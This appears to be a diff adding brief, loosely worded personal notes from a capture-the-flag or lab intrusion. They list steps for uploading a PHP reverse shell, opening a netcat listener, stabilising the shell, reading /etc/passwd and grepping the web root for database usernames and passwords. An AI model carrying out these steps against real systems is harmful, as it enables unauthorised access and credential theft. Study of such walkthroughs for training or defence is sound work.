@@ -1,0 +1,13 @@
+locate /php/ reverse  (for take the code for upload int file)
+mousepad rev.php
+nc -lvnp 1080 -- listener
+forbidden -- the file is having in the command
+web site -- stabilize the shell
+after hacking to stable the shells
+cat/etc/password -- to find the users
+robert
+bin/bash
+cd var/www/html -- for searching the username && passwords
+grep -rn -- to find the all username && passwords
+grep -rn db_USERNAME
+lin pieces
